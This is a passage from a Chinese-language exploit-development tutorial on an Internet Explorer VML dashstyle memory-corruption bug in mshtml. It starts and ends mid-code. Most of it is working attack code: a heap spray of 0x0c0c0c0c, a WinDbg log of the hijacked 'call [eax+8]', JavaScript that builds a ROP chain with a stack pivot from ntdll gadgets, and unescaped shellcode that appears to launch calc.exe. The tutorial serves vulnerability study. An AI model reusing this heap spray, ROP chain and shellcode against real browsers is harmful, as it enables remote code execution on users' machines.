    "%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" +
    "%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff" +
    "%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c" +
    "%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5" +
    "%u6c61%u2e63%u7865%u0065");
     var fill = unescape("%u0c0c%u0c0c");
     while (fill.length 
效果：
对比脚本代码，我们知道堆喷射也成功了。位于0x0c0c0c0c地址处的数据恰好是rop的开头。前面代码的rop链构造的有些奇怪，和我开头所说的有点不同，它在xchg指令之前还有一些指令，这是为什么呢?
其实这是根据漏洞实际情况来构造的。我们看看劫持程序时的一个情景：
    0:014> g
    (430.99c): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=41414141 ebx=1260773c ecx=12d0b010 edx=00000c8d esi=12607750 edi=12607738
    eip=6ca5f20f esp=024eb5d0 ebp=024eb608 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:WindowsSystem32mshtml.dll - 
    mshtml!Ordinal104+0x4ec70:
    6ca5f20f ff5008          call    dword ptr [eax+8]    ds:0023:41414149=????????
    0:005> u
    mshtml!Ordinal104+0x4ec70:
    6ca5f20f ff5008          call    dword ptr [eax+8]
    6ca5f212 ebf7            jmp     mshtml!Ordinal104+0x4ec6c (6ca5f20b)
    6ca5f214 90              nop
    6ca5f215 90              nop
    6ca5f216 90              nop
    6ca5f217 90              nop
    6ca5f218 90              nop
    6ca5f219 8b425c          mov     eax,dword ptr [edx+5Ch]
这里的eax的值就是通过 **vml1.dashstyle.array.item(6) = 0x41414141**
设置的，设置成0x41414141的目的是为了便于分析劫持程序流程时的一些情况。可以看到eax的值就是我们设置的。程序最终会调用 **call dword
ptr [eax+8]** 指令来实现虚函数调用。我们来将eax假定为 0x0c0c0c0c，对照着rop链来推理一波。
    rop链：
    stack_pivot = getRealAddr(ntdll_base,0x0001578a);//# ret # from ntdll    
    function getRealAddr(base ,offect){
     var real_addr = base + offect;
     var str = real_addr.toString(16);
     var s1 = str.substring(0,4);
     var s2 = str.substring(4,8);
     return "%u" + s2 + "%u" + s1
    }
    var ntdll_base = 0x775a0000;
    stack_pivot = getRealAddr(ntdll_base,0x0001578a);
    stack_pivot += getRealAddr(ntdll_base,0x000096c9);
    stack_pivot += getRealAddr(ntdll_base,0x00015789);
    ntdll_rop = getRealAddr(ntdll_base ,0x45F18);
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%uffff%uffff";
    ntdll_rop += "%u0c34%u0c0c";
    ntdll_rop += "%u0c38%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0c3c%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0400%u0000";
    ntdll_rop += "%u4141%u4141";
    rop_chains = unescape(stack_pivot + ntdll_rop);
    //heapspray  
     // [ Shellcode ]
    var shellcode = unescape(
    "%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30" +
    "%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031" +
    "%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752" +
    "%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a" +
    "%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34" +
    "%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475" +
    "%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" +
    "%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424" +
    "%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" +
    "%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff" +
    "%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c" +
    "%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5" +
    "%u6c61%u2e63%u7865%u0065");
     var fill = unescape("%u0c0c%u0c0c");
     while (fill.length < 0x1000){
     fill += fill;